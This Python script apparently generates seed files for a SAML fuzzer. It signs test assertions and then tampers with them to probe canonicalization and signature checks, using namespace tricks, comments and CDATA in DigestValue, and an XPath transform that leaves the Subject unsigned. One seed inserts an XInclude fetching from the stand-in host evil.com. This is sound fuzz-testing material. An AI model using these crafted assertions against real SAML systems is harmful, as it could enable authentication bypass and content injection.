#!/usr/bin/env python3
"""Generate C14N torture test seeds for SAML fuzzer."""

import os
import re
from lxml import etree
from signxml import XMLSigner
from signxml.algorithms import SignatureConstructionMethod
from cryptography.hazmat.primitives.serialization import load_pem_private_key

KEY_PATH = os.path.join(os.path.dirname(__file__), "saml_fixtures", "idp_key.pem")
CERT_PATH = os.path.join(os.path.dirname(__file__), "saml_fixtures", "idp_cert.pem")
OUT_DIR = os.path.join(os.path.dirname(__file__), "saml_seeds")

with open(KEY_PATH, "rb") as f:
    key = load_pem_private_key(f.read(), password=None)
with open(CERT_PATH, "rb") as f:
    cert = f.read()

NSMAP = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml": "urn:oasis:names:tc:SAML:2.0:assertion",
}


def make_base(assertion_id, extra_ns=None):
    resp = etree.Element(
        "{urn:oasis:names:tc:SAML:2.0:protocol}Response",
        attrib={
            "ID": "_resp_c14n",
            "Version": "2.0",
            "IssueInstant": "2026-03-01T22:55:38Z",
            "Destination": "https://sp.example.com/acs",
        },
        nsmap=NSMAP,
    )
    etree.SubElement(resp, "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer").text = (
        "https://idp.example.com"
    )
    status = etree.SubElement(resp, "{urn:oasis:names:tc:SAML:2.0:protocol}Status")
    etree.SubElement(
        status, "{urn:oasis:names:tc:SAML:2.0:protocol}StatusCode"
    ).set("Value", "urn:oasis:names:tc:SAML:2.0:status:Success")

    a_nsmap = dict(NSMAP)
    if extra_ns:
        a_nsmap.update(extra_ns)
    assertion = etree.SubElement(
        resp,
        "{urn:oasis:names:tc:SAML:2.0:assertion}Assertion",
        attrib={"Version": "2.0", "ID": assertion_id, "IssueInstant": "2026-03-01T22:55:38Z"},
        nsmap=a_nsmap,
    )
    etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Issuer").text = (
        "https://idp.example.com"
    )
    subject = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Subject")
    nameid = etree.SubElement(subject, "{urn:oasis:names:tc:SAML:2.0:assertion}NameID")
    nameid.set("Format", "urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress")
    nameid.text = "user@example.com"
    sc = etree.SubElement(subject, "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmation")
    sc.set("Method", "urn:oasis:names:tc:SAML:2.0:cm:bearer")
    scd = etree.SubElement(sc, "{urn:oasis:names:tc:SAML:2.0:assertion}SubjectConfirmationData")
    scd.set("NotOnOrAfter", "2026-03-01T23:55:38Z")
    scd.set("Recipient", "https://sp.example.com/acs")

    cond = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}Conditions")
    cond.set("NotBefore", "2026-03-01T22:55:38Z")
    cond.set("NotOnOrAfter", "2026-03-01T23:55:38Z")
    ar = etree.SubElement(cond, "{urn:oasis:names:tc:SAML:2.0:assertion}AudienceRestriction")
    etree.SubElement(ar, "{urn:oasis:names:tc:SAML:2.0:assertion}Audience").text = (
        "https://sp.example.com"
    )

    authn = etree.SubElement(assertion, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnStatement")
    authn.set("AuthnInstant", "2026-03-01T22:55:38Z")
    authn.set("SessionIndex", "_session_c14n")
    ac = etree.SubElement(authn, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContext")
    etree.SubElement(
        ac, "{urn:oasis:names:tc:SAML:2.0:assertion}AuthnContextClassRef"
    ).text = "urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport"

    return resp, assertion


def sign_assertion(resp, assertion):
    signer = XMLSigner(
        method=SignatureConstructionMethod.enveloped,
        c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#",
    )
    signed = signer.sign(assertion, key=key, cert=cert)
    resp.remove(assertion)
    resp.append(signed)
    return resp


def save(resp, filename):
    xml = etree.tostring(resp, xml_declaration=True, encoding="UTF-8")
    path = os.path.join(OUT_DIR, filename)
    with open(path, "wb") as f:
        f.write(xml)
    print(f"  Created {filename} ({len(xml)} bytes)")


def save_raw(xml, filename):
    path = os.path.join(OUT_DIR, filename)
    with open(path, "wb") as f:
        f.write(xml)
    print(f"  Created {filename} ({len(xml)} bytes)")


# 1. c14n_superfluous_ns.xml
resp, a = make_base("_assert_c14n_01", {"unused": "http://example.com/unused", "foo": "http://foo.bar/ns"})
save(sign_assertion(resp, a), "c14n_superfluous_ns.xml")

# 2. c14n_inherited_ns.xml
resp, a = make_base("_assert_c14n_02", {"custom": "http://custom.example.com/v1"})
ns = {"saml": "urn:oasis:names:tc:SAML:2.0:assertion"}
nameid = a.find(".//saml:NameID", ns)
nameid.set("{http://custom.example.com/v1}attr", "test")
save(sign_assertion(resp, a), "c14n_inherited_ns.xml")

# 3. c14n_default_ns.xml (post-processed)
resp, a = make_base("_assert_c14n_03")
xml = etree.tostring(sign_assertion(resp, a), xml_declaration=True, encoding="UTF-8")
xml = xml.replace(
    b"<saml:Assertion",
    b'<Assertion xmlns="urn:oasis:names:tc:SAML:2.0:assertion"',
    1,
)
save_raw(xml, "c14n_default_ns.xml")

# 4. c14n_xml_attrs.xml
resp, a = make_base("_assert_c14n_04")
resp.set("{http://www.w3.org/XML/1998/namespace}lang", "en")
a.set("{http://www.w3.org/XML/1998/namespace}space", "preserve")
save(sign_assertion(resp, a), "c14n_xml_attrs.xml")

# 5. c14n_attr_entities.xml (post-processed)
resp, a = make_base("_assert_c14n_05")
xml = etree.tostring(sign_assertion(resp, a), xml_declaration=True, encoding="UTF-8")
xml = xml.replace(b'ID="_assert_c14n_05"', b'ID="_assert_c14n_05&#13;&#10;"')
save_raw(xml, "c14n_attr_entities.xml")

# 6. c14n_inclusive_prefixlist.xml (post-processed)
resp, a = make_base("_assert_c14n_06")
xml = etree.tostring(sign_assertion(resp, a), xml_declaration=True, encoding="UTF-8")
inc_ns = (
    b'<ec:InclusiveNamespaces xmlns:ec="http://www.w3.org/2001/10/xml-exc-c14n#"'
    b' PrefixList="saml ds samlp #default"/>'
)
xml = xml.replace(
    b'Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>',
    b'Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#">' + inc_ns + b"</ds:Transform>",
    1,
)
save_raw(xml, "c14n_inclusive_prefixlist.xml")

# 7. digestvalue_comment.xml
resp, a = make_base("_assert_c14n_07")
xml = etree.tostring(sign_assertion(resp, a), xml_declaration=True, encoding="UTF-8")
m = re.search(rb"<ds:DigestValue>(.*?)</ds:DigestValue>", xml)
if m:
    real_dv = m.group(1)
    xml = xml.replace(
        b"<ds:DigestValue>" + real_dv,
        b"<ds:DigestValue><!-- -->" + real_dv,
    )
save_raw(xml, "digestvalue_comment.xml")

# 8. digestvalue_cdata.xml
resp, a = make_base("_assert_c14n_08")
xml = etree.tostring(sign_assertion(resp, a), xml_declaration=True, encoding="UTF-8")
m = re.search(rb"<ds:DigestValue>(.*?)</ds:DigestValue>", xml)
if m:
    real_dv = m.group(1)
    xml = xml.replace(
        b"<ds:DigestValue>" + real_dv,
        b"<ds:DigestValue><![CDATA[" + real_dv + b"]]>",
    )
save_raw(xml, "digestvalue_cdata.xml")

# 9. xpath_transform_filter.xml
resp, a = make_base("_assert_c14n_09")
xml = etree.tostring(sign_assertion(resp, a), xml_declaration=True, encoding="UTF-8")
xpath_t = (
    b'<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xpath-19991116">'
    b'<ds:XPath xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">'
    b"not(ancestor-or-self::saml:Subject)</ds:XPath></ds:Transform>"
)
xml = xml.replace(b"<ds:Transforms>", b"<ds:Transforms>" + xpath_t)
save_raw(xml, "xpath_transform_filter.xml")

# 10. xinclude_inject.xml
resp, a = make_base("_assert_c14n_10")
ns_xi = "http://www.w3.org/2001/XInclude"
xi_include = etree.Element("{%s}include" % ns_xi, nsmap={"xi": ns_xi})
xi_include.set("href", "http://evil.com/inject.xml")
xi_fallback = etree.SubElement(xi_include, "{%s}fallback" % ns_xi)
xi_fallback.text = "fallback-content"
a.insert(1, xi_include)
save(sign_assertion(resp, a), "xinclude_inject.xml")

print("\nDone! Created 10 seed files.")
